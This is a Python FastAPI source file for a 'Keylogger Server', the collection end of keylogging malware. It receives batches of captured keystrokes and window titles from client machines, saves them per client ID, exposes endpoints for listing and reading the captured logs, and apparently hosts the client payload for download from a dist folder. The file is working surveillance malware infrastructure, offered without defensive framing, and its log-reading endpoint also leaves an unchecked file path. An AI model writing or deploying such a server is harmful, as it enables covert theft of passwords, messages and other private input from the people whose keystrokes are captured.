from fastapi import FastAPI, HTTPException
from fastapi.responses import FileResponse
from pydantic import BaseModel
from datetime import datetime
import json
import os
from typing import List, Optional
import uvicorn

app = FastAPI(title="Keylogger Server", version="1.0.0")

# Data models
class KeylogData(BaseModel):
    timestamp: str
    keystroke: str
    window_title: Optional[str] = None

class KeylogBatch(BaseModel):
    client_id: str
    data: List[KeylogData]

# Create data directory if it doesn't exist
DATA_DIR = "data/keylogs"
if not os.path.exists(DATA_DIR):
    os.makedirs(DATA_DIR)

# Dist folder path for file downloads
DIST_DIR = "dist"

@app.get("/")
async def root():
    return {"message": "Keylogger Server is running", "status": "active"}

@app.get("/health")
async def health_check():
    return {"status": "healthy", "timestamp": datetime.now().isoformat()}

@app.post("/keylog")
async def receive_keylog(keylog_batch: KeylogBatch):
    """
    Receive keylog data from client
    """
    try:
        # Create filename with client ID and timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{DATA_DIR}/keylog_{keylog_batch.client_id}_{timestamp}.json"
        
        # Prepare data for saving
        save_data = {
            "client_id": keylog_batch.client_id,
            "received_at": datetime.now().isoformat(),
            "total_keystrokes": len(keylog_batch.data),
            "data": [item.dict() for item in keylog_batch.data]
        }
        
        # Save to file
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(save_data, f, indent=2, ensure_ascii=False)
        
        return {
            "status": "success",
            "message": f"Saved {len(keylog_batch.data)} keystrokes",
            "filename": filename
        }
    
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error saving keylog data: {str(e)}")

@app.get("/keylogs")
async def list_keylogs():
    """
    List all saved keylog files
    """
    try:
        files = []
        for filename in os.listdir(DATA_DIR):
            if filename.startswith("keylog_") and filename.endswith(".json"):
                filepath = os.path.join(DATA_DIR, filename)
                stat = os.stat(filepath)
                files.append({
                    "filename": filename,
                    "size": stat.st_size,
                    "modified": datetime.fromtimestamp(stat.st_mtime).isoformat()
                })
        
        return {"files": files, "total": len(files)}
    
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error listing files: {str(e)}")

@app.get("/keylogs/{filename}")
async def get_keylog(filename: str):
    """
    Get specific keylog file content
    """
    try:
        filepath = os.path.join(DATA_DIR, filename)
        if not os.path.exists(filepath):
            raise HTTPException(status_code=404, detail="File not found")
        
        with open(filepath, 'r', encoding='utf-8') as f:
            data = json.load(f)
        
        return data
    
    except FileNotFoundError:
        raise HTTPException(status_code=404, detail="File not found")
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error reading file: {str(e)}")

@app.get("/files")
async def list_dist_files():
    """
    List all files in the dist folder available for download
    """
    try:
        if not os.path.exists(DIST_DIR):
            return {"files": [], "total": 0, "message": "Dist folder not found"}
        
        files = []
        for root, dirs, filenames in os.walk(DIST_DIR):
            for filename in filenames:
                filepath = os.path.join(root, filename)
                relative_path = os.path.relpath(filepath, DIST_DIR)
                stat = os.stat(filepath)
                files.append({
                    "filename": filename,
                    "relative_path": relative_path.replace("\\", "/"),  # Use forward slashes for URLs
                    "size": stat.st_size,
                    "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
                    "download_url": f"/download/{relative_path.replace(os.sep, '/')}"
                })
        
        return {"files": files, "total": len(files)}
    
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error listing dist files: {str(e)}")

@app.get("/download/{file_path:path}")
async def download_file(file_path: str):
    """
    Download a file from the dist folder
    """
    try:
        # Construct the full file path
        full_path = os.path.join(DIST_DIR, file_path)
        
        # Security check: ensure the file is within the dist directory
        if not os.path.abspath(full_path).startswith(os.path.abspath(DIST_DIR)):
            raise HTTPException(status_code=403, detail="Access denied")
        
        # Check if file exists
        if not os.path.exists(full_path):
            raise HTTPException(status_code=404, detail="File not found")
        
        # Check if it's a file (not a directory)
        if not os.path.isfile(full_path):
            raise HTTPException(status_code=400, detail="Path is not a file")
        
        # Get filename for download
        filename = os.path.basename(full_path)
        
        # Return file for download
        return FileResponse(
            path=full_path,
            filename=filename,
            media_type='application/octet-stream'
        )
    
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error downloading file: {str(e)}")

if __name__ == "__main__":
    print("Starting Keylogger Server...")
    print("Server will be available at: http://localhost:8000")
    print("API documentation at: http://localhost:8000/docs")
    uvicorn.run(app, host="0.0.0.0", port=8000)
